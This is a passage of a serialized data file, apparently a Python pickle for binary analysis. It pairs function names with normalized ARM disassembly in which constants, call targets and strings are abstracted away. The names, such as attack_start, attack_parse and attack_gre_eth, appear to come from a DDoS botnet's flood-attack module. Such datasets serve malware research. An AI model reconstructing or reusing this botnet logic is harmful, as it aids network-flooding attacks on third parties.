[R2,R3]\nCMP~R3,0\nMOV~R4,R0\nADDEQ~R4,R0,0\nADD~R5,R5,R4\nMOV~R0,R5\nRSB~R1,R4,R10\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nMOV~R12,R0\nBEQ~FOO\nADD~LR,SP,0\nADD~LR,LR,0\nADD~R3,LR,R4\nCMP~R0,0\nSUB~R3,R3,0\nSUBGT~R12,R0,0\nSUB~R3,R3,0\nMOV~R2,0\nMOV~R0,R5\nMOV~R1,0\nSTRB~R2,[R3,R12]\nBL~FOO\nSTR~R0,[R7,0]\nMOV~R1,0\nB~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R4\nBL~FOO\nLDR~R12,[SP,0]\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R3,R2,R12\nSUB~R3,R3,0\nSUB~R3,R3,0\nLDRB~R3,[R3,R0]\nLDR~LR,[SP,0]\nCMP~R3,0\nMOV~R8,R0\nRSB~R3,LR,R10\nADDEQ~R8,R0,0\nRSB~R6,R8,R3\nADD~R5,R4,R8\nMOV~R0,R5\nMOV~R1,R6\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nMOV~R4,R0\nBEQ~FOO\nLDR~R1,[SP,0]\nCMP~R0,0\nSUBGT~R4,R0,0\nADD~R11,R1,R8\nMOV~R0,R5\nMOV~R1,R6\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nADD~R9,R9,R11\nBLE~FOO\nMOV~R0,R5\nMOV~R1,R6\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nSUB~R4,R0,0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R3,R2,R11\nSUB~R3,R3,0\nSUB~R3,R3,0\nMOV~R2,0\nSTRB~R2,[R3,R4]\nADD~R3,SP,0\nSTR~R2,[R3,0]\nB~FOO\nLDRB~R3,[R9,R4]\nCMP~R3,0\nBEQ~FOO\nADD~R12,SP,0\nSTR~R2,[R12,0]\nADD~LR,SP,0\nMOV~R0,R9\nLDR~R4,[LR,0]\nBL~FOO\nADD~R1,SP,0\nCMP~R4,R0\nLDR~R4,[R1,0]\nADD~R2,R4,0\nBLT~FOO\nLDRB~R3,[R9,R4]\nCMP~R3,0\nBNE~FOO\nMOV~R3,0\nADD~R2,SP,0\nSTR~R3,[R2,0]\nB~FOO\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R3,R3,0\nSTR~R3,[R12,0]\nADD~LR,SP,0\nLDR~R3,[LR,0]\nLDR~R12,[SP,0]\nMOV~R1,R3,LSL0\nADD~R1,R1,0\nADD~R1,R12,R1\nLDR~R12,[R7,0]\nCMP~R3,R12\nMOV~R0,R9\nMOV~R2,R4\nBLT~FOO\nB~FOO\nMOV~R3,0\nSTRB~R3,[R6,R2]\nB~FOO\nLDR~R0,[R7,0]\nLDR~LR,[SP,0]\nMOV~R0,R0,LSL0\nADD~R0,R0,0\nADD~R0,LR,R0\nMOV~R1,R9\nBL~FOO\nLDR~R3,[R7,0]\nADD~R3,R3,0\nSTR~R3,[R7,0]\nLDR~R1,[SP,0]\nADD~R1,R1,R8\nSTR~R1,[SP,0]\nLDR~R2,[SP,0]\nADD~R9,SP,0\nMOV~R1,0\nSUB~R9,R9,0\nMOV~R0,0\nADD~R4,R9,R2\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R4\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nLDR~R3,[R7,0]\nCMP~R3,0\nBLE~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R9\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R9\nBL~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R3,R0\nLDR~R3,<STR>\nLDRB~R3,[R2,R3]\nCMP~R3,0\nMOV~R4,R0\nADDEQ~R4,R0,0\nADD~R6,R9,R4\nMOV~R0,R6\nRSB~R1,R4,R10\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nMOV~LR,R0\nBEQ~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nCMP~R0,0\nADD~R12,R1,R4\nSUBGT~LR,R0,0\nSUB~R12,R12,0\nADD~R5,LR,0\nSUB~R12,R12,0\nMOV~R8,0\nMOV~R0,R6\nMOV~R1,R5\nLDR~R2,<STR>\nMOV~R3,0\nSTRB~R8,[R12,LR]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R2,SP,0\nMOV~R3,0\nSTR~R3,[R2,0]\nLDRB~R3,[R6,0]\nCMP~R3,0\nMOVEQ~R3,0\nSTREQ~R3,[R2,0]\nADD~R3,SP,0\nLDR~R1,[R3,0]\nMOV~R0,R6\nRSB~R2,R1,R5\nADD~R1,R6,R1\nBL~FOO\nADD~R12,SP,0\nSTR~R8,[R12,0]\nB~FOO\nCMP~R3,0\nBEQ~FOO\nADD~LR,SP,0\nSTR~R1,[LR,0]\nADD~R1,SP,0\nLDR~R2,[R1,0]\nLDRB~R3,[R6,R2]\nCMP~R3,0\nADD~R1,R2,0\nBNE~FOO\nMOV~R0,R6\nBL~FOO\nCMP~R0,0\nBLE~FOO\nMOV~R0,R6\nBL~FOO\nCMP~R0,0\nLDRLE~R2,[SP,0]\nADDLE~R0,R2,0\nADDLE~R0,R0,0\nMOVLE~R1,R6\nBLLE~FOO\nADD~R3,SP,0\nLDR~R0,[R3,0]\nADD~R0,R6,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nLDR~R12,[SP,0]\nADD~R5,R12,0\nADD~R5,R5,0\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nADD~LR,SP,0\nLDR~R0,[LR,0]\nADD~R0,R6,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nB~FOO\nLDRB~R3,[R9,R4]\nCMP~R3,0\nBNE~FOO\nLDR~R3,[SP,0]\nADD~R5,R3,0\nADD~R5,R5,0\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nADD~R12,SP,0\nLDR~R0,[R12,0]\nADD~R0,R6,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~LR,SP,0\nLDR~R0,[LR,0]\nADD~R0,R6,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nADD~R2,SP,0\nLDR~R1,[R2,0]\nADD~R1,R6,R1\nMOV~R0,R5\nADD~R1,R1,0\nBL~FOO\nB~FOO\nMOV~R3,0\nSTRB~R3,[R6,R2]\nB~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nADD~R4,SP,0\nSUB~R4,R4,0\nMOV~R2,R0\nMOV~R1,R10\nMOV~R0,R4\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R10\nMOV~R2,R0\nMOV~R0,R4\nBL~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R3,R0\nLDR~R3,<STR>\nLDRB~R3,[R2,R3]\nCMP~R3,0\nMOV~R6,R0\nADDEQ~R6,R0,0\nADD~R8,R4,R6\nMOV~R0,R8\nRSB~R1,R6,R10\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nMOV~R9,R0\nBEQ~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R6\nCMP~R0,0\nSUB~R3,R3,0\nMOV~R2,0\nSUBGT~R9,R0,0\nSUB~R3,R3,0\nADD~LR,SP,0\nSTRB~R2,[R3,R9]\nSTR~R2,[LR,0]\nB~FOO\nADD~R1,SP,0\nSTR~R0,[R1,0]\nADD~R3,SP,0\nLDR~R2,[R3,0]\nLDRB~R1,[R8,R2]\nSUB~R3,R1,0\nCMP~R3,0\nADD~R0,R2,0\nBLS~FOO\nCMP~R1,0\nBEQ~FOO\nMOV~R6,0\nSTRB~R6,[R8,R2]\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R2,R3,0\nSTR~R2,[R12,0]\nLDRB~R3,[R8,R2]\nCMP~R3,0\nADDEQ~R3,R2,0\nSTREQ~R3,[R12,0]\nADD~LR,SP,0\nLDR~R4,[LR,0]\nADD~R4,R8,R4\nMOV~R0,R4\nBL~FOO\nLDR~R2,<STR>\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nADD~R1,SP,0\nLDR~R4,[R1,0]\nADD~R5,R8,R4\nMOV~R0,R5\nBL~FOO\nLDR~R2,<STR>\nMOV~R1,R0\nMOV~R0,R5\nBL~FOO\nADD~R2,SP,0\nADD~R4,R4,R0\nSTR~R4,[R2,0]\nADD~R3,SP,0\nLDR~R2,[R3,0]\nLDRB~R3,[R8,R2]\nCMP~R3,0\nBNE~FOO\nADD~R3,R2,0\nADD~R4,R8,R3\nADD~R12,SP,0\nMOV~R0,R4\nSTR~R3,[R12,0]\nBL~FOO\nADD~R4,R4,R0\nLDRB~R3,[R4,-0]\nCMP~R3,0\nBNE~FOO\nADD~LR,SP,0\nLDR~R4,[LR,0]\nADD~R4,R8,R4\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nSTRB~R6,[R4,-0]\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nB~FOO\nBL~FOO\nSUB~R3,R4,0\nCMP~R3,0\nMOV~R0,0\nBHI~FOO\nBL~FOO\nLDR~R1,[SP,0]\nADD~R3,R1,R4\nCMP~R3,R0\nMOV~R0,0\nBHI~FOO\nADD~R2,SP,0\nLDR~R4,[R2,0]\nADD~R6,R8,R4\nMOV~R0,R6\nBL~FOO\nLDR~R2,<STR>\nMOV~R1,R0\nMOV~R0,R6\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R12,SP,0\nMOV~R3,0\nSTR~R3,[R12,0]\nLDRB~R3,[R6,0]\nCMP~R3,0\nMOVEQ~R3,0\nSTREQ~R3,[R12,0]\nADD~LR,SP,0\nLDR~R1,[LR,0]\nADD~R2,R9,0\nRSB~R2,R1,R2\nMOV~R0,R6\nADD~R1,R6,R1\nBL~FOO\nMOV~R3,0\nADD~R1,SP,0\nSTR~R3,[R1,0]\nB~FOO\nCMP~R3,0\nBEQ~FOO\nADD~R2,SP,0\nSTR~R1,[R2,0]\nADD~R3,SP,0\nLDR~R2,[R3,0]\nLDRB~R3,[R6,R2]\nCMP~R3,0\nADD~R1,R2,0\nBNE~FOO\nMOV~R0,R6\nBL~FOO\nCMP~R0,0\nBLE~FOO\nMOV~R0,R6\nBL~FOO\nCMP~R0,0\nLDRLE~R12,[SP,0]\nADDLE~R0,R12,0\nADDLE~R0,R0,0\nMOVLE~R1,R6\nBLLE~FOO\nADD~LR,SP,0\nLDR~R0,[LR,0]\nADD~R0,R6,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nLDR~R1,[SP,0]\nADD~R4,R1,0\nADD~R4,R4,0\nMOV~R1,0\nMOV~R0,R4\nBL~FOO\nADD~R2,SP,0\nLDR~R0,[R2,0]\nADD~R0,R6,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nADDGT~R3,SP,0\nLDRGT~R1,[R3,0]\nBGT~FOO\nB~FOO\nLDRB~R3,[R8,R4]\nCMP~R3,0\nBNE~FOO\nADD~R12,SP,0\nLDR~R0,[R12,0]\nADD~R0,R6,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nLDR~LR,[SP,0]\nADD~R4,LR,0\nADD~R4,R4,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nADD~R1,SP,0\nLDR~R0,[R1,0]\nADD~R0,R6,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~R2,SP,0\nLDR~R1,[R2,0]\nADD~R1,R6,R1\nMOV~R0,R4\nADD~R1,R1,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R0,R3,0\nADD~R0,R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R3,0\nB~FOO\nLDR~R12,[SP,0]\nADD~R0,SP,0\nMOV~R1,R10\nLDR~R2,<STR>\nMOV~R3,0\nSUB~R0,R0,0\nADD~R5,R12,0\nBL~FOO\nADD~R5,R5,0\nMOV~R4,R0\nLDR~R1,<STR>\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R3,0\nB~FOO\nCMP~R10,R4\nMOVGT~R3,0\nMOVLE~R3,0\nADD~R1,SP,0\nSTRB~R3,[R7,-0]\nSUB~R1,R1,0\nMOV~R2,R4\nLDR~R0,[R7,-0]\nMOV~R3,0\nBL~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nB~FOO\nLDRB~R3,[R7,-0]\nCMP~R3,0\nBNE~FOO\nLDR~R3,[R7,0]\nCMP~R3,0\nBNE~FOO\nLDR~LR,[SP,0]\nADD~R0,LR,0\nADD~R0,R0,0\nADD~R1,R0,0\nMOV~R2,0\nBL~FOO\nLDR~R3,[R7,0]\nSUB~R3,R3,0\nSTR~R3,[R7,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R0]\nLDR~R1,[SP,0]\nADD~R8,R1,0\nLDR~R1,[R7,0]\nADD~R8,R8,0\nRSB~R2,R1,0\nMOV~R4,R0\nADD~R1,R8,R1\nLDR~R0,[R7,-0]\nADD~R3,R3,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R3,0\nSTR~R3,[R4]\nB~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nBEQ~FOO\nB~FOO\nLDR~R3,[R7,0]\nLDR~R2,[SP,0]\nADD~R3,R3,R0\nSTR~R3,[R7,0]\nSTR~R2,[R7,-0]\nLDR~R3,[R7,0]\nCMP~R3,0\nBLE~FOO\nLDR~R5,[R7,0]\nLDR~R9,[R7,-0]\nCMP~R3,R5\nMOVLT~R4,R3\nMOVGE~R4,R5\nRSB~R3,R4,R3\nCMP~R9,0\nSTR~R3,[R7,0]\nBNE~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R5\nMOV~R2,R0\nMOV~R3,0\nMOV~R0,R8\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R1,0\nMOV~R0,0\nLDR~R4,[R7,0]\nBL~FOO\nMOV~R1,R4\nMOV~R2,R0\nMOV~R3,0\nMOV~R0,R8\nBL~FOO\nLDR~R1,[R7,0]\nADD~R6,R8,R0\nMOV~R4,R0\nRSB~R1,R0,R1\nMOV~R3,R9\nMOV~R0,R6\nLDR~R2,<STR>\nBL~FOO\nLDR~R3,[R7,0]\nLDR~R12,[SP,0]\nADD~R10,R4,R0\nCMP~R3,0\nMOV~R11,0\nADD~R3,R10,R12\nSTRB~R11,[R3,0]\nBGT~FOO\nMOV~R0,R6\nBL~FOO\nCMP~R0,0\nBGT~FOO\nLDR~LR,[SP,0]\nLDR~R0,[R7,0]\nADD~R5,LR,0\nMOV~R1,R6\nADD~R0,R5,R0,LSL0\nBL~FOO\nLDR~R4,[R7,0]\nADD~R4,R5,R4,LSL0\nMOV~R0,R4\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R4,R0\nBL~FOO\nADD~R4,R10,0\nLDR~R1,[R7,0]\nADD~R6,R8,R4\nRSB~R1,R4,R1\nLDR~R2,<STR>\nMOV~R3,R9\nMOV~R0,R6\nBL~FOO\nLDR~R1,[SP,0]\nLDR~R3,[R7,0]\nADD~R4,R4,R1\nADD~R5,R5,R3,LSL0\nADD~R4,R4,R0\nSTRB~R11,[R4,0]\nMOV~R0,R5\nBL~FOO\nMOV~R1,R6\nADD~R0,R5,R0\nBL~FOO\nLDR~R3,[R7,0]\nADD~R3,R3,0\nSTR~R3,[R7,0]\nMOV~R3,0\nSTR~R3,[R7,0]\nADD~R3,R3,0\nB~FOO\nMOV~R4,0\nLDR~R6,[R7,0]\nCMP~R6,0\nBNE~FOO\nLDR~R5,[R7,0]\nCMP~R5,0\nBNE~FOO\nMOV~R0,R8\nLDR~R1,[R7,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nLDR~R1,[R7,0]\nLDR~R2,<STR>\nMOV~R3,0\nMOV~R0,R8\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R4,R0\nADD~R12,R0,R2\nMOV~R1,R4\nMOV~R0,R8\nLDR~R2,<STR>\nMOV~R3,R5\nSTRB~R6,[R12,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R3,R5\nMOV~R0,R8\nMOV~R1,R4\nLDR~R2,<STR>\nBL~FOO\nLDR~R3,[SP,0]\nADD~R0,R0,R3\nSTRB~R6,[R0,0]\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nADD~R3,R0,0\nSTR~R3,[R7,0]\nB~FOO\nLDR~R3,[R7,0]\nRSB~R3,R4,R3\nCMP~R3,0\nSTR~R3,[R7,0]\nBEQ~FOO\nCMP~R4,0\nBEQ~FOO\nLDR~R3,[R7,0]\nRSB~R3,R4,R3\nMOV~R2,R3\nSTR~R3,[R7,0]\nADD~R1,R8,R4\nMOV~R0,R8\nBL~FOO\nLDR~R3,[R7,0]\nLDR~R12,[SP,0]\nCMP~R3,0\nMOV~R2,0\nADD~R3,R3,R12\nSTRB~R2,[R3,0]\nBEQ~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nBL~FOO\nMOV~R4,R0\nMOV~R3,0\nSTR~R3,[R4]\nADD~R1,SP,0\nSUB~R1,R1,0\nLDR~R0,[R7,-0]\nMOV~R2,0\nADD~R3,R3,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R7,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R7,-0]\nADD~R3,R3,0\nB~FOO\nSTRB~R5,[R7,-0]\nB~FOO\nLDRB~R3,[R7,-0]\nCMP~R3,0\nBEQ~FOO\nMOV~R3,0\nSTRB~R3,[R7,-0]\nLDR~LR,[SP,0]\nADD~LR,LR,0\nADD~R7,R7,0\nSTR~LR,[SP,0]\nADD~R7,R7,0\nLDR~R1,[SP,0]\nLDR~R2,[SP,0]\nCMP~R1,R2\nBLT~FOO\nB~FOO\nMOV~R0,R9\nBL~FOO\nCMP~R0,0\nBLE~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p179
L7112L
tp180
a(S'attack_get_opt_str'
p181
S'"STMFD~SP!,{R4,LR}\nAND~R0,R0,0\nMOV~R4,R3\nAND~R2,R2,0\nMOV~R12,0\nB~FOO\nLDRB~R3,[R1,0]\nCMP~R3,R2\nADD~R1,R1,0\nLDREQ~R4,[LR]\nBEQ~FOO\nCMP~R12,R0\nMOV~LR,R1\nADD~R12,R12,0\nBLT~FOO\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p182
L68L
tp183
a(S'attack_get_opt_ip'
p184
S'"STMFD~SP!,{R4,LR}\nAND~R0,R0,0\nAND~R2,R2,0\nMOV~R4,R3\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDMFD~SP!,{R4,LR}\nB~FOO\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p185
L48L
tp186
a(S'attack_get_opt_int'
p187
S'"STMFD~SP!,{R4,LR}\nAND~R0,R0,0\nAND~R2,R2,0\nMOV~R4,R3\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nMOV~R1,0\nBEQ~FOO\nLDMFD~SP!,{R4,LR}\nB~FOO\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p188
L52L
tp189
a(S'attack_start'
p190
S'"STMFD~SP!,{R4-R10,LR}\nMOV~R9,R3\nMOV~R6,R0\nAND~R7,R1,0\nAND~R8,R2,0\nLDRB~R10,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R5,R3\nORRGT~R5,R3,0\nCMP~R5,0\nLDMNEFD~SP!,{R4-R10,PC}\nBL~FOO\nCMN~R0,0\nMOV~R4,R0\nMOVEQ~R0,R5\nBEQ~FOO\nCMP~R4,0\nBEQ~FOO\nLDR~R3,<STR>\nLDRB~R1,[R3]\nLDR~R3,<STR>\nLDR~R2,[R3]\nMOV~R0,R5\nB~FOO\nMOV~R0,R6\nBL~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R0,R4\nBL~FOO\nMOV~R0,R8\nMOV~R1,R9\nMOV~R2,R10\nLDR~R3,[SP,0]\nMOV~LR,PC\nLDR~PC,[R12]\nB~FOO\nLDR~R12,[R2,R0,LSL0]\nLDRB~R3,[R12,0]\nCMP~R3,R7\nBEQ~FOO\nADD~R0,R0,0\nCMP~R0,R1\nBLT~FOO\nMOV~R0,0\nB~FOO"'
p191
L204L
tp192
a(S'attack_parse'
p193
S'"STMFD~SP!,{R4-R11,LR}\nCMP~R1,0\nSUB~SP,SP,0\nMOV~R5,R1\nMOV~R4,R0\nBLS~FOO\nCMP~R1,0\nLDR~R1,[R0]\nSTR~R1,[SP,0]\nBEQ~FOO\nLDRB~R2,[R0,0]\nCMP~R5,0\nSTR~R2,[SP,0]\nBEQ~FOO\nLDRB~R9,[R0,0]\nCMP~R9,0\nBEQ~FOO\nMOV~R3,0\nMUL~R2,R9,R3\nSUB~R3,R5,0\nCMP~R3,R2\nBCC~FOO\nMOV~R0,R9\nMOV~R1,0\nBL~FOO\nADD~R12,R4,0\nMOV~R10,R0\nMOV~LR,0\nB~FOO\nLDRB~R1,[R12,0]\nLDR~R2,[R12]\nMOV~R3,0\nSTRB~R3,[LR,R10]\nMOV~R3,0\nSTRB~R3,[R6,0]\nSTRB~R1,[R0,-0]\nSTR~R2,[R0,-0]\nSTR~R2,[R0,-0]\nADD~LR,LR,0\nADD~R12,R12,0\nMOV~R3,0\nMLA~R2,R9,R3,R4\nADD~R3,R2,0\nCMP~R12,R3\nADD~R6,LR,R10\nADD~R0,R0,0\nBNE~FOO\nMOV~R3,0\nMLA~R3,R9,R3,R5\nSUBS~R0,R3,0\nSTREQ~R0,[SP,0]\nBEQ~FOO\nLDRB~R12,[R2,0]\nCMP~R12,0\nSTR~R12,[SP,0]\nSTREQ~R12,[SP,0]\nBEQ~FOO\nLDR~R0,[SP,0]\nMOV~R1,0\nADD~R6,R2,0\nSUB~R5,R3,0\nBL~FOO\nMOV~R11,0\nMOV~R7,R0\nSTR~R0,[SP,0]\nB~FOO\nADD~R3,R6,0\nCMP~R5,0\nADD~R8,R3,0\nBEQ~FOO\nLDRB~R2,[R6]\nSUBS~R3,R5,0\nSUB~R3,R3,0\nSTRB~R2,[R7,0]\nBEQ~FOO\nLDRB~R4,[R6,0]\nCMP~R3,R4\nADD~R0,R4,0\nRSB~R5,R4,R3\nADD~R6,R8,R4\nADD~R7,R7,0\nBLT~FOO\nBL~FOO\nMOV~R1,R8\nSTR~R0,[R7,-0]\nMOV~R2,R4\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R1,0\nCMP~R11,R2\nADD~R11,R11,R1\nBNE~FOO\nBL~FOO\nLDR~R3,[SP,0]\nAND~R1,R3,0\nAND~R2,R3,0\nLDR~R12,[SP,0]\nMOV~R1,R1,LSR0\nMOV~R2,R2,LSL0\nORR~R2,R2,R3,LSL0\nORR~R1,R1,R3,LSR0\nMOV~R3,0\nSTR~R3,[R0]\nSTR~R12,[SP]\nLDR~R12,[SP,0]\nORR~R0,R1,R2\nMOV~R3,R10\nLDR~R1,[SP,0]\nMOV~R2,R9\nSTR~R12,[SP,0]\nBL~FOO\nCMP~R10,0\nMOVNE~R0,R10\nBLNE~FOO\nLDR~R1,[SP,0]\nCMP~R1,0\nMOVNE~R4,0\nBNE~FOO\nB~FOO\nLDR~R2,[SP,0]\nLDR~R3,[R2,R4,LSL0]\nSUBS~R0,R3,0\nADD~R4,R4,0\nBLNE~FOO\nLDR~R3,[SP,0]\nCMP~R4,R3\nBLT~FOO\nLDR~R0,[SP,0]\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,LR}\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p194
L532L
tp195
a(S'attack_kill_all'
p196
S'"STMFD~SP!,{R4,LR}\nLDR~R4,<STR>\nLDR~R0,[R4]\nCMP~R0,0\nMOV~R1,0\nBLNE~FOO\nMOV~R3,0\nSTR~R3,[R4]\nLDR~R3,<STR>\nCMP~R4,R3\nBNE~FOO\nLDMFD~SP!,{R4,LR}\nB~FOO"'
p197
L52L
tp198
a(S'add_attack'
p199
S'"STMFD~SP!,{R4-R8,LR}\nMOV~R4,R0\nMOV~R8,R1\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R6,<STR>\nLDRB~R1,[R6]\nLDR~R7,<STR>\nMOV~R1,R1,LSL0\nMOV~R5,R0\nAND~R4,R4,0\nADD~R1,R1,0\nLDR~R0,[R7]\nSTRB~R4,[R5,0]\nSTR~R8,[R5]\nBL~FOO\nLDRB~R3,[R6]\nADD~R2,R3,0\nSTR~R5,[R0,R3,LSL0]\nSTR~R0,[R7]\nSTRB~R2,[R6]\nLDMFD~SP!,{R4-R8,PC}"'
p200
L92L
tp201
a(S'attack_init'
p202
S'"STR~LR,[SP,-0]\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p203
L132L
tp204
a(S'attack_gre_eth'
p205
S'"STMFD~SP!,{R4-R11,LR}\nAND~R0,R0,0\nSUB~SP,SP,0\nMOV~R9,R1\nMOV~R1,0\nMOV~R5,R3\nAND~R4,R2,0\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R1,R5\nMOV~R12,R0\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nAND~R10,R12,0\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,R5\nMOV~R12,R0\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nAND~R8,R12,0\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R2,0\nMOV~R3,0\nMOV~R1,R5\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R2,0\nMOV~R3,R2\nMOV~R1,R5\nMOV~R11,R0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,<STR>\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nLDR~R3,[R3]\nMOV~R2,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,0\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R0,0\nBL~FOO\nCMN~R0,0\nSTR~R0,[SP,0]\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nMOV~R12,0\nMOV~R1,0\nADD~R2,R2,0\nSTR~R12,[SP]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[SP,0]\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nMOV~R1,0\nLDR~R0,<STR>\nBL~FOO\nLDR~R1,[SP,0]\nLDR~R3,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R4,[R1,R3,LSL0]\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nLDRB~R3,[R4]\nLDR~R5,[SP,0]\nMOV~LR,R11,LSL0\nBIC~R3,R3,0\nCMP~R5,0\nORR~R3,R3,0\nADD~R12,LR,0\nLDR~R2,[SP,0]\nMOV~R1,R12,LSR0\nSTRB~R3,[R4]\nMOVNE~R3,0\nSTRNEB~R3,[R4,0]\nA